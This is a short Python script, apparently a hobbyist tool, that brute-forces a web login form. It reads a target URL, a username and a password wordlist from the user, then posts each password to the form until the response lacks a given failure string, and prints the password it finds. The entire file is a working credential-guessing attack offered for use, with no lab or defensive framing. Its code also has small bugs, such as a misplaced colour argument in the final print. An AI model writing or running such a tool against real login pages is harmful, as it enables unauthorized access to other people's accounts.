import requests
import pyfiglet
from termcolor import colored

ascii_banner = pyfiglet.figlet_format("LOGIN BRUTEFOCERR")
print(ascii_banner)


url = input("[*] Enter Page's URL :\n\t--> ")
username = input("[*] Enter The Username :\n\t--> ")
wordlist = input("[*] Enter Wordlist File :\n\t--> ")
failure = input("[*] Enter String When Login Fails :\n\t--> ")


def bruteforcing(username, url):
    for password in wordlist:
        password = password.strip()
        data = {'username':username, 'password':password, 'Login':'Submit'}
        response = requests.post(url, data=data)
        if failure in response.content.decode():
            pass
        else:
            print(colored(("[+] Found Password : "+ password), 'green'))
            exit()


with open(wordlist, 'r') as wordlist:
    bruteforcing(username, url)


print(colored("[-] Password Not In This List"), 'red')

# no need to use wordlist.close() cause the 'with' statement does it automatically